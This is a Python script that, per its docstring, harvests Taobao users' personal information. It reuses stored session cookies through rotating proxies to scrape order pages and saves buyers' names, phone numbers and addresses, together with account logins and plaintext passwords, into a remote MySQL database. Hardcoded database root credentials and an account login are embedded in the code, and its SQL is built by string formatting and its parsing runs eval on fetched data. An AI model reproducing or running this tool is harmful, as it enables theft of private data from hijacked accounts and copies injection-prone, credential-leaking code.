#!/usr/local/bin/python3
#-*- coding: UTF-8 -*-




"""获取淘宝用户的个人信息：昵称、电话、收件人姓名、地址"""



import pymysql
import requests, json, re, random



class get_order_msg():
    def __init__(self, username, pwd):

        self.username = username
        self.pwd = pwd

        self.taobao_con = pymysql.connect(
            host='120.27.147.99',
            user="root",
            password="Root_12root",
            database="python_taobao_demo",
            charset='utf8'
        )

        self.taobao_cur = self.taobao_con.cursor()

        proxy_sql = "SELECT proxy FROM `proxy_table`"
        try:
            self.taobao_cur.execute(proxy_sql)
        except Exception as E:
            print("查询错误！{}".format(E))

        aa = self.taobao_cur.fetchall()
        self.iplist = [i[0] for i in aa]

        self.order_url = "https://buyertrade.taobao.com/trade/itemlist/list_bought_items.htm"

        self.user_nice_url = "https://member1.taobao.com/member/fresh/account_security.htm"



    def get_user_nice(self, cookie):
        """获取个人的昵称"""
        header = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Cookie": cookie,
            "Host": "member1.taobao.com",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
        }

        proxy = eval(random.choice(self.iplist))

        usernine_reql = requests.get(self.user_nice_url, headers=header, proxies=proxy, allow_redirects=False)

        usernine_reql.encoding = "gbk"
        usernice = re.findall('<span class="default grid-msg ">(.*?)</span>', usernine_reql.text)

        return usernice[0]




    def get_html(self, cookie, user_agent):
        """在订单详情中获取个人信息"""
        proxy = eval(random.choice(self.iplist))

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "keep-alive",
            "Cookie": cookie,
            "Host": "buyertrade.taobao.com",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent
        }

        usernice = self.get_user_nice(cookie)

        try:
            reql = requests.get(self.order_url, headers=headers, proxies=proxy)

            reql.encoding = 'gbk'
            order_json_list = json.loads(eval(re.findall("JSON.parse(.*?);\n</script>", reql.text, re.S)[0]))
            for order in order_json_list["mainOrders"]:
                for li in order['statusInfo']['operations']:
                    if li['text'] == "订单详情":
                        if "tradearchive" in li['url']:
                            order_url = str('https:' + li['url']).replace("buyertrade", "trade")
                        else:
                            order_url = str('https:' + li['url']).replace("buyertrade", "trade").replace("item", "order")

                        phone_header = {
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                            "Accept-Encoding": "gzip, deflate, br",
                            "Accept-Language": "zh-CN,zh;q=0.9",
                            "Cache-Control": "max-age=0",
                            "Connection": "keep-alive",
                            "Cookie": "swfstore=30633;" + cookie,
                            "Host": str(re.findall("//(.*?)/", li['url'])[0]).replace("buyertrade", "trade"),
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-Site": "none",
                            "Sec-Fetch-User": "?1",
                            "Upgrade-Insecure-Requests": "1",
                            "User-Agent": user_agent
                        }

                        phone_reql = requests.get(order_url, headers=phone_header, proxies=proxy, allow_redirects=False)

                        if phone_reql.status_code == 200:
                            try:
                                if "trade.tmall" in order_url:
                                    phone_json = re.findall("detailData = (.*?)</script>", phone_reql.text, re.S)
                                    json_list = str(json.loads(phone_json[0])['basic']['lists'][0]['content'][0]['text']).split(',')

                                elif "trade.taobao" in order_url:
                                    phone_json = re.findall("JSON.parse\(\'(.*?)\'\);", phone_reql.text, re.S)
                                    json_list = None
                                    address = json.loads(re.findall('"deliveryInfo":(.*?),"mainOrder"', str(phone_json[0]).strip().replace('\\"', '"').replace("false", "\"false\"").replace("true", "\"true\""))[0])
                                    if "address" in address:
                                        json_list = address["address"].split('，')

                                else:
                                    phone_json = str(re.findall("收货地址：</td>(.*?)</td>", phone_reql.text, re.S)[0]).strip().replace("<td>", "").replace("\n", "").replace("\t", "")
                                    json_list = None
                                    if phone_json:
                                        json_list = [i for i in phone_json.split('，') if len(i) >= 1]

                                if json_list and len(json_list) > 3:
                                        username = json_list[0]
                                        phone_num = json_list[1]
                                        addess = json_list[2].split(' ')

                                        insert_sql = "INSERT INTO user_detail_table (usernice, recipients, phone_number, province, city, district, street, detail_address, log_username, log_pwd) VALUES('{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}')".format(usernice, username, phone_num, addess[0], addess[1], addess[2], addess[3], addess[4], self.username, self.pwd)

                                        try:
                                            self.taobao_cur.execute(insert_sql)
                                        except Exception as fn:
                                            if "PRIMARY" in str(fn):
                                                update_sql = """UPDATE user_detail_table SET createtime=NOW() WHERE log_username='{}' AND log_pwd='{}'""".format(self.username, self.pwd)
                                                try:
                                                    self.taobao_cur.execute(update_sql)
                                                except Exception as EF:
                                                    print("数据更改失败：{}".format(fn))
                                            else:
                                                print("数据插入失败：{}".format(fn))

                                break

                            except Exception as df1:
                                print("详情错误！{}".format(df1))

                    break

        except Exception as E:
            print(E)




    def main(self):
        select_sql = "SELECT cookie, user_agent FROM `cookie_table` WHERE username='{}' AND pwd='{}'".format(self.username, self.pwd)
        try:
            self.taobao_cur.execute(select_sql)
        except Exception as E:
            print("查询错误！{}".format(E))

        cookie = self.taobao_cur.fetchall()


        self.get_html(cookie[0][0], cookie[0][1])

        self.taobao_con.commit()
        self.taobao_cur.close()
        self.taobao_con.close()




def start_func(username, pwd):
    get_ordermsg = get_order_msg(username, pwd)
    get_ordermsg.main()





if __name__ == '__main__':
    username = "清鹆hedy"
    pwd = "7708893fhj"
    start_func(username, pwd)

